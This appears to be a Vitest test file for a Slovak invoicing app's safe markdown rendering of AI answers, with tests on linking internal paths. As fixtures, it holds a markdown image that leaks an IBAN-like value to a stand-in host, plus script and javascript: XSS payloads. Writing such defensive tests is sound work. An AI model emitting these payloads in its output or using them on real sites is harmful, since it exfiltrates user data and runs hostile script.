import { describe, expect, it } from "vitest";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import ReactMarkdown from "react-markdown";
import { BEZPECNY_MARKDOWN, internaCesta, prelinkujCesty } from "./markdown-ai";

const html = (md: string) =>
  renderToStaticMarkup(createElement(ReactMarkdown, { ...BEZPECNY_MARKDOWN, children: md }));

describe("odpoveď AI v markdowne", () => {
  it("nekreslí obrázky (únik údajov cez adresu obrázka)", () => {
    const h = html("Súhrn ![x](https://zly.example/?d=IBAN123) hotovo");
    expect(h).not.toContain("<img");
    expect(h).not.toContain("zly.example");
  });
  it("nespustí HTML ani javascript: odkaz", () => {
    const h = html(
      "<img src=x onerror=alert(1)> <script>alert(1)</script> [klik](javascript:alert(1))",
    );
    expect(h).not.toMatch(/<img|<script|href="javascript:/);
    expect(h).toContain("&lt;img");
  });
  it("bežné formátovanie a odkaz ostanú", () => {
    const h = html("**Spolu** 123 € — [faktúra](/faktury/1)");
    expect(h).toContain("<strong>Spolu</strong>");
    expect(h).toContain('href="/faktury/1"');
  });
});

describe("cesty aplikácie v odpovedi AI", () => {
  const useky = new Set(["nastavenia", "uctovnictvo", "pomoc", "faktury"]);
  it("holú cestu zmení na odkaz", () => {
    expect(prelinkujCesty("Choďte do /nastavenia/pohoda.", useky)).toBe(
      "Choďte do [/nastavenia/pohoda](/nastavenia/pohoda).",
    );
    expect(prelinkujCesty("(pozri /pomoc)", useky)).toBe("(pozri [/pomoc](/pomoc))");
  });
  it("nemení existujúce odkazy, kód ani neznáme cesty", () => {
    const md = "[tu](/nastavenia/x) a `/uctovnictvo/predkontacie` a /neexistuje/x a 1/2 a https://faktero.sk/pomoc";
    expect(prelinkujCesty(md, useky)).toBe(md);
    const blok = "```\n/nastavenia/x\n```";
    expect(prelinkujCesty(blok, useky)).toBe(blok);
  });
  it("rozlíši internú a cudziu adresu", () => {
    expect(internaCesta("/faktury/1", useky)).toBe("/faktury/1");
    expect(internaCesta("/zle", useky)).toBeNull();
    expect(internaCesta("https://faktero.sk/pomoc/pohoda", useky, "https://faktero.sk")).toBe("/pomoc/pohoda");
    expect(internaCesta("https://cudzi.sk/pomoc", useky, "https://faktero.sk")).toBeNull();
    expect(internaCesta("//cudzi.sk/pomoc", useky, "https://faktero.sk")).toBeNull();
  });
});
